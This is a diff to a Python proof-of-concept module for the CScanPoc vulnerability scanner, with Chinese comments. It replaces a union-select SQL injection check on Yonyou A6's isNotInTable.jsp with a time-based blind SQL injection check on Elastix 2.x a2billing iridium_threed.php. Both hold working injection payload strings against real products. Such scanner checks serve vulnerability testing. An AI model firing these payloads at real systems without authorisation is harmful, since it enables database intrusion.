@@ -1,29 +1,30 @@
 # coding: utf-8
+import re
+import time
 import requests
-
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
+    vuln_id = 'Elastix_0101' # 平台漏洞编号，留空
+    name = 'Elastix 2.x /a2billing/customer/iridium_threed.php BLIND SQL注入' # 漏洞名称
+    level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    disclosure_date = '2015-04-06'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    Vulnerable Source Code snippet in "a2billing/customer/iridium_threed.php".
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'http://www.exploit-db.com/exploits/36305/' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Yonyou'  # 漏洞应用名称
-    product_version = 'Unknown'  # 漏洞应用版本
+    product = 'Elastix'  # 漏洞应用名称
+    product_version = '2.x'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = '5151973b-258b-4095-9d35-1207529060d7' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -34,11 +35,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
-            url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
-            req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            verify_url = self.target + '/a2billing/customer/iridium_threed.php'
+            payload = '?transactionID=-1 and 1=benchmark(2000000,md5(1))'
+            start_time = time.time()
+            req = requests.get(verify_url + payload)
+            if req.status_code == 200 and time.time() - start_time > 5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
